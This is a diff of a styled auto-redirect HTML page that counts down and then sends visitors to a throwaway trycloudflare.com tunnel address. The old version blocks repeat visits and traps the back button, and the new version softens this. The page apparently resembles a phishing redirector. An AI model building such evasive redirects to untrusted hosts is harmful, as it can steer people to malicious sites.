@@ -1,450 +1,508 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Redirecting to your destination">
-    <title>Redirecting...</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Redirecting to your destination" />
+  <title>Redirecting...</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    /* Your original CSS styles (unchanged) */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #4f46e5, #7c3aed);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #ffffff;
-            text-align: center;
-            padding: 1rem;
-            position: relative;
-            overflow: hidden;
-        }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #4f46e5, #7c3aed);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #ffffff;
+      text-align: center;
+      padding: 1rem;
+      position: relative;
+      overflow: hidden;
+    }
 
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.25;
-        }
+    canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      opacity: 0.25;
+    }
 
-        .container {
-            max-width: 520px;
-            width: 90%;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(14px);
-            border-radius: 24px;
-            padding: 2rem;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.2);
-            animation: popIn 0.8s ease-out;
-            transition: opacity 0.5s ease, transform 0.5s ease;
-            position: relative;
-            z-index: 1;
-        }
+    .container {
+      max-width: 520px;
+      width: 90%;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(14px);
+      border-radius: 24px;
+      padding: 2rem;
+      box-shadow: 0 12px 48px rgba(0, 0, 0, 0.2);
+      animation: popIn 0.8s ease-out;
+      transition: opacity 0.5s ease, transform 0.5s ease;
+      position: relative;
+      z-index: 1;
+    }
 
-        h1 {
-            font-weight: 600;
-            font-size: 1.8rem;
-            margin-bottom: 0.75rem;
-            animation: textGlow 2.5s ease-in-out infinite;
-        }
+    h1 {
+      font-weight: 600;
+      font-size: 1.8rem;
+      margin-bottom: 0.75rem;
+      animation: textGlow 2.5s ease-in-out infinite;
+    }
 
-        p {
-            font-weight: 400;
-            font-size: 1rem;
-            line-height: 1.6;
-            opacity: 0.9;
-            margin-bottom: 1rem;
-        }
+    p {
+      font-weight: 400;
+      font-size: 1rem;
+      line-height: 1.6;
+      opacity: 0.9;
+      margin-bottom: 1rem;
+    }
 
-        .countdown {
-            font-size: 1.1rem;
-            font-weight: 500;
-            margin-bottom: 1.5rem;
-            opacity: 0.85;
-        }
+    .countdown {
+      font-size: 1.1rem;
+      font-weight: 500;
+      margin-bottom: 1.5rem;
+      opacity: 0.85;
+    }
 
-        .progress-bar {
-            width: 100%;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 1.5rem;
-        }
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 1.5rem;
+    }
 
-        .progress {
-            width: 0;
-            height: 100%;
-            background: linear-gradient(90deg, #ffffff, #a5b4fc);
-            border-radius: 3px;
-            box-shadow: 0 0 12px rgba(255, 255, 255, 0.6);
-        }
+    .progress {
+      width: 0;
+      height: 100%;
+      background: linear-gradient(90deg, #ffffff, #a5b4fc);
+      border-radius: 3px;
+      box-shadow: 0 0 12px rgba(255, 255, 255, 0.6);
+    }
 
-        .btn {
-            display: inline-block;
-            padding: 0.8rem 1.6rem;
-            background: #ffffff;
-            color: #4f46e5;
-            font-weight: 500;
-            font-size: 0.95rem;
-            text-decoration: none;
-            border-radius: 9999px;
-            transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.3s ease;
-            cursor: pointer;
-            border: none;
-            position: relative;
-            overflow: hidden;
-        }
+    .btn {
+      display: inline-block;
+      padding: 0.8rem 1.6rem;
+      background: #ffffff;
+      color: #4f46e5;
+      font-weight: 500;
+      font-size: 0.95rem;
+      text-decoration: none;
+      border-radius: 9999px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease,
+        background 0.3s ease;
+      cursor: pointer;
+      border: none;
+      position: relative;
+      overflow: hidden;
+    }
 
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            background: #e0e7ff;
-        }
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      background: #e0e7ff;
+    }
 
-        .btn:active {
-            transform: scale(0.95);
-        }
+    .btn:active {
+      transform: scale(0.95);
+    }
 
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            transition: width 0.3s ease, height 0.3s ease;
-        }
+    .btn::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.3s ease, height 0.3s ease;
+    }
 
-        .btn:hover::before {
-            width: 200px;
-            height: 200px;
-        }
+    .btn:hover::before {
+      width: 200px;
+      height: 200px;
+    }
 
-        .icons {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-        }
+    .icons {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
 
-        .icon {
-            width: 24px;
-            height: 24px;
-            fill: #ffffff;
-            opacity: 0.7;
-            animation: float 3s ease-in-out infinite;
-        }
+    .icon {
+      width: 24px;
+      height: 24px;
+      fill: #ffffff;
+      opacity: 0.7;
+      animation: float 3s ease-in-out infinite;
+    }
 
-        .icon:nth-child(2) { animation-delay: 0.5s; }
-        .icon:nth-child(3) { animation-delay: 1s; }
+    .icon:nth-child(2) {
+      animation-delay: 0.5s;
+    }
+    .icon:nth-child(3) {
+      animation-delay: 1s;
+    }
 
-        .loading-overlay {
-            position: fixed;
-            inset: 0;
-            background: linear-gradient(135deg, #4f46e5, #7c3aed);
-            display: grid;
-            place-items: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease;
-            z-index: 1000;
-        }
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(135deg, #4f46e5, #7c3aed);
+      display: grid;
+      place-items: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+      z-index: 1000;
+    }
 
-        .loading-overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
+    .loading-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
 
-        .spinner {
-            width: 48px;
-            height: 48px;
-            display: grid;
-            place-items: center;
-            position: relative;
-            animation: pulse 2s ease-in-out infinite;
-        }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      display: grid;
+      place-items: center;
+      position: relative;
+      animation: pulse 2s ease-in-out infinite;
+    }
 
-        .spinner::before,
-        .spinner::after {
-            content: '';
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: #ffffff;
-            border-radius: 50%;
-            animation: orbit 1.5s ease-in-out infinite;
-        }
+    .spinner::before,
+    .spinner::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: #ffffff;
+      border-radius: 50%;
+      animation: orbit 1.5s ease-in-out infinite;
+    }
 
-        .spinner::after {
-            animation-delay: -0.75s;
-        }
+    .spinner::after {
+      animation-delay: -0.75s;
+    }
 
-        .quote {
-            font-size: 1rem;
-            font-weight: 400;
-            opacity: 0.9;
-            max-width: 85%;
-            margin-top: 1.5rem;
-            animation: fadeInQuote 0.8s ease-in;
-        }
+    .quote {
+      font-size: 1rem;
+      font-weight: 400;
+      opacity: 0.9;
+      max-width: 85%;
+      margin-top: 1.5rem;
+      animation: fadeInQuote 0.8s ease-in;
+    }
 
-        .access-denied {
-            color: #ff6b6b;
-            margin-top: 1rem;
-            font-weight: 500;
-            display: none;
-        }
+    .access-denied {
+      color: #ff6b6b;
+      margin-top: 1rem;
+      font-weight: 500;
+      display: none;
+    }
 
-        @keyframes popIn {
-            0% { opacity: 0; transform: scale(0.9); }
-            60% { opacity: 1; transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
+    @keyframes popIn {
+      0% {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      60% {
+        opacity: 1;
+        transform: scale(1.05);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
 
-        @keyframes textGlow {
-            0%, 100% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
-            50% { text-shadow: 0 0 15px rgba(255, 255, 255, 0.8); }
-        }
+    @keyframes textGlow {
+      0%,
+      100% {
+        text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
+      }
+      50% {
+        text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+      }
+    }
 
-        @keyframes load {
-            0% { width: 0; }
-            100% { width: 100%; }
-        }
+    @keyframes load {
+      0% {
+        width: 0;
+      }
+      100% {
+        width: 100%;
+      }
+    }
 
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
+    @keyframes float {
+      0%,
+      100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-8px);
+      }
+    }
 
-        @keyframes orbit {
-            0% { transform: translateX(0) scale(1); opacity: 1; }
-            50% { transform: translateX(20px) scale(0.5); opacity: 0.5; }
-            100% { transform: translateX(0) scale(1); opacity: 1; }
-        }
+    @keyframes orbit {
+      0% {
+        transform: translateX(0) scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: translateX(20px) scale(0.5);
+        opacity: 0.5;
+      }
+      100% {
+        transform: translateX(0) scale(1);
+        opacity: 1;
+      }
+    }
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
+    @keyframes pulse {
+      0%,
+      100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
 
-        @keyframes fadeInQuote {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 0.9; transform: translateY(0); }
-        }
+    @keyframes fadeInQuote {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 0.9;
+        transform: translateY(0);
+      }
+    }
 
-        @media (max-width: 480px) {
-            .container {
-                padding: 1.5rem;
-                width: 95%;
-            }
+    @media (max-width: 480px) {
+      .container {
+        padding: 1.5rem;
+        width: 95%;
+      }
 
-            h1 {
-                font-size: 1.5rem;
-            }
+      h1 {
+        font-size: 1.5rem;
+      }
 
-            p, .countdown, .quote {
-                font-size: 0.9rem;
-            }
+      p,
+      .countdown,
+      .quote {
+        font-size: 0.9rem;
+      }
 
-            .btn {
-                padding: 0.7rem 1.4rem;
-                font-size: 0.9rem;
-            }
+      .btn {
+        padding: 0.7rem 1.4rem;
+        font-size: 0.9rem;
+      }
 
-            .icons {
-                gap: 0.75rem;
-            }
+      .icons {
+        gap: 0.75rem;
+      }
 
-            .icon {
-                width: 20px;
-                height: 20px;
-            }
-        }
+      .icon {
+        width: 20px;
+        height: 20px;
+      }
+    }
 
-        @media (max-width: 360px) {
-            h1 {
-                font-size: 1.3rem;
-            }
+    @media (max-width: 360px) {
+      h1 {
+        font-size: 1.3rem;
+      }
 
-            .container {
-                padding: 1.2rem;
-            }
-        }
-    </style>
+      .container {
+        padding: 1.2rem;
+      }
+    }
+  </style>
 </head>
 <body>
-    <canvas id="particleCanvas"></canvas>
-    <main class="container" id="mainContainer">
-        <h1>Redirecting You Now</h1>
-        <p>You're being taken to your destination. Click below if the redirect doesn't start.</p>
-        <div class="countdown" id="countdown">Redirecting in <span id="timer"></span> seconds...</div>
-        <div class="icons">
-            <svg class="icon" viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm0-12a1 1 0 00-1 1v4a1 1 0 002 0V9a1 1 0 00-1-1z"/></svg>
-            <svg class="icon" viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm-1-5l4-4a1 1 0 00-1.41-1.41L11 12.17V7a1 1 0 00-2 0v8a1 1 0 002 0z"/></svg>
-            <svg class="icon" viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm-2-5h4a1 1 0 000-2h-4a1 1 0 000 2z"/></svg>
-        </div>
-        <div class="progress-bar">
-            <div class="progress" id="progress"></div>
-        </div>
-        <button class="btn" id="redirectBtn">Go Now</button>
-        <div class="access-denied" id="accessDenied">Access denied. You can only visit this page once.</div>
-    </main>
-
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="quote" id="quote"></div>
+  <canvas id="particleCanvas"></canvas>
+  <main class="container" id="mainContainer">
+    <h1>Redirecting You Now</h1>
+    <p>You're being taken to your destination. Click below if the redirect doesn't start.</p>
+    <div class="countdown" id="countdown">
+      Redirecting in <span id="timer"></span> seconds...
     </div>
+    <div class="icons">
+      <svg class="icon" viewBox="0 0 24 24">
+        <path
+          d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm0-12a1 1 0 00-1 1v4a1 1 0 002 0V9a1 1 0 00-1-1z"
+        />
+      </svg>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path
+          d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm-1-5l4-4a1 1 0 00-1.41-1.41L11 12.17V7a1 1 0 00-2 0v8a1 1 0 002 0z"
+        />
+      </svg>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path
+          d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm-2-5h4a1 1 0 000-2h-4a1 1 0 000 2z"
+        />
+      </svg>
+    </div>
+    <div class="progress-bar">
+      <div class="progress" id="progress"></div>
+    </div>
+    <button class="btn" id="redirectBtn" type="button">Go Now</button>
+  </main>
+  <div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
+    <div class="spinner"></div>
+  </div>
+  <div class="access-denied" id="accessDenied">Access denied. Redirecting...</div>
 
-    <script>
-        // Check if this is a repeat visit
-        if (sessionStorage.getItem('redirectVisited')) {
-            document.getElementById('mainContainer').style.display = 'none';
-            document.getElementById('accessDenied').style.display = 'block';
-            
-            // Redirect to home or another page after showing message
-            setTimeout(() => {
-                window.location.replace('https://genesis-firms-destroyed-upon.trycloudflare.com');
-            }, 3000);
+  <script>
+    (() => {
+      const destination = 'https://fact-presented-tonight-routines.trycloudflare.com'; // your redirect URL here
+      const redirectVisitedKey = 'redirectPageVisited';
+      const loggedInKey = 'userLoggedIn'; // This should be set by your login system
+
+      // Simulate logged in check - replace this with your real login check
+      const isLoggedIn = sessionStorage.getItem(loggedInKey) === 'true';
+
+      const mainContainer = document.getElementById('mainContainer');
+      const accessDenied = document.getElementById('accessDenied');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const timerEl = document.getElementById('timer');
+      const progressEl = document.getElementById('progress');
+      const redirectBtn = document.getElementById('redirectBtn');
+
+      const redirectDelay = 7; // seconds
+      let secondsLeft = redirectDelay;
+
+      // Function to handle the redirect countdown
+      function startRedirectCountdown() {
+        timerEl.textContent = secondsLeft;
+        const interval = setInterval(() => {
+          secondsLeft--;
+          if (secondsLeft <= 0) {
+            clearInterval(interval);
+            doRedirect();
+          }
+          timerEl.textContent = secondsLeft;
+          progressEl.style.width = ((redirectDelay - secondsLeft) / redirectDelay) * 100 + '%';
+        }, 1000);
+      }
+
+      // Perform the actual redirect
+      function doRedirect() {
+        loadingOverlay.classList.add('active');
+        // Clear the redirect flag so next visit is fresh
+        sessionStorage.removeItem(redirectVisitedKey);
+        window.location.replace(destination);
+      }
+
+      // Setup redirect button click
+      redirectBtn.addEventListener('click', () => {
+        doRedirect();
+      });
+
+      // Initial page logic
+
+      if (sessionStorage.getItem(redirectVisitedKey)) {
+        // Already visited redirect page before
+        if (!isLoggedIn) {
+          // Not logged in - block access and redirect after delay
+          mainContainer.style.display = 'none';
+          accessDenied.style.display = 'block';
+          setTimeout(() => {
+            window.location.replace(destination);
+          }, 3000);
         } else {
-            // Mark as visited
-            sessionStorage.setItem('redirectVisited', 'true');
-            
-            // Particle background
-            const canvas = document.getElementById('particleCanvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-
-            const particles = [];
-            class Particle {
-                constructor() {
-                    this.x = Math.random() * canvas.width;
-                    this.y = Math.random() * canvas.height;
-                    this.size = Math.random() * 2 + 1;
-                    this.speedX = Math.random() * 0.4 - 0.2;
-                    this.speedY = Math.random() * 0.4 - 0.2;
-                }
-                update() {
-                    this.x += this.speedX;
-                    this.y += this.speedY;
-                    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
-                    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
-                }
-                draw() {
-                    ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fill();
-                }
-            }
-
-            for (let i = 0; i < 40; i++) {
-                particles.push(new Particle());
-            }
-
-            function animateParticles() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                particles.forEach(p => {
-                    p.update();
-                    p.draw();
-                });
-                requestAnimationFrame(animateParticles);
-            }
-            animateParticles();
-
-            // Prevent history manipulation
-            history.replaceState(null, null, ' ');
-            window.addEventListener('popstate', () => {
-                history.replaceState(null, null, ' ');
-                window.location.replace('https://example.com');
-            });
-
-            const redirectBtn = document.getElementById('redirectBtn');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const quoteElement = document.getElementById('quote');
-            const container = document.querySelector('.container');
-            const timerElement = document.getElementById('timer');
-            const progressElement = document.getElementById('progress');
-            const destination = 'https://genesis-firms-destroyed-upon.trycloudflare.com';
-
-            const quotes = [
-                "Patience turns dreams into achievements.",
-                "Kindness is a gift that grows with giving.",
-                "Seek knowledge to light your path.",
-                "Every step forward is a victory.",
-                "Trust in time to reveal truth."
-            ];
-
-            // Random redirect time between 10 and 15 seconds
-            const redirectTime = Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000;
-            let timeLeft = Math.ceil(redirectTime / 1000);
-
-            // Countdown timer
-            timerElement.textContent = timeLeft;
-            const countdownInterval = setInterval(() => {
-                timeLeft--;
-                timerElement.textContent = timeLeft;
-                if (timeLeft <= 0) clearInterval(countdownInterval);
-            }, 1000);
-
-            // Dynamic progress bar animation
-            progressElement.style.animation = `load ${redirectTime}ms cubic-bezier(0.4, 0, 0.2, 1) forwards`;
-
-            function showLoading() {
-                quoteElement.textContent = quotes[Math.floor(Math.random() * quotes.length)];
-                loadingOverlay.classList.add('active');
-                container.style.opacity = '0';
-                container.style.transform = 'translateY(15px)';
-            }
-
-            function redirect() {
-                showLoading();
-                setTimeout(() => {
-                    // Replace the current history entry with the destination
-                    window.location.replace(destination);
-                }, 500);
-            }
-
-            redirectBtn.addEventListener('click', (e) => {
-                e.preventDefault();
-                clearInterval(countdownInterval);
-                redirect();
-            });
-
-            // Auto-redirect after random time
-            const redirectTimeout = setTimeout(redirect, redirectTime);
-
-            // Prevent scrolling during redirect
-            window.addEventListener('beforeunload', () => {
-                window.scrollTo(0, 0);
-            });
-
-            // Resize canvas on window resize
-            window.addEventListener('resize', () => {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            });
-
-            // Clean up if user leaves before redirect completes
-            window.addEventListener('unload', () => {
-                clearTimeout(redirectTimeout);
-                clearInterval(countdownInterval);
-            });
+          // Logged in - allow access and clear flag to prevent issues next time
+          sessionStorage.removeItem(redirectVisitedKey);
+          // Show the main content and start countdown as normal
+          mainContainer.style.display = 'block';
+          accessDenied.style.display = 'none';
+          startRedirectCountdown();
         }
-    </script>
+      } else {
+        // First visit to redirect page, set flag and start countdown
+        sessionStorage.setItem(redirectVisitedKey, 'true');
+        startRedirectCountdown();
+      }
+
+      // Optional: Remove any automatic forced redirect on back button to prevent loops
+      window.addEventListener('popstate', (e) => {
+        // No forced redirect here, allow natural navigation
+      });
+
+      // Particle background animation (your original code simplified)
+
+      const canvas = document.getElementById('particleCanvas');
+      const ctx = canvas.getContext('2d');
+      let particlesArray;
+
+      function initCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        particlesArray = [];
+        const particleCount = 70;
+
+        for (let i = 0; i < particleCount; i++) {
+          particlesArray.push({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            size: Math.random() * 3 + 1,
+            speedX: (Math.random() - 0.5) * 0.5,
+            speedY: (Math.random() - 0.5) * 0.5,
+            opacity: Math.random() * 0.5 + 0.2,
+          });
+        }
+      }
+
+      function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        particlesArray.forEach((p) => {
+          p.x += p.speedX;
+          p.y += p.speedY;
+
+          if (p.x > canvas.width || p.x < 0) p.speedX = -p.speedX;
+          if (p.y > canvas.height || p.y < 0) p.speedY = -p.speedY;
+
+          ctx.beginPath();
+          ctx.fillStyle = `rgba(255, 255, 255, ${p.opacity})`;
+          ctx.shadowColor = '#ffffff';
+          ctx.shadowBlur = 4;
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fill();
+        });
+
+        requestAnimationFrame(animateParticles);
+      }
+
+      window.addEventListener('resize', () => {
+        initCanvas();
+      });
+
+      initCanvas();
+      animateParticles();
+    })();
+  </script>
 </body>
 </html>
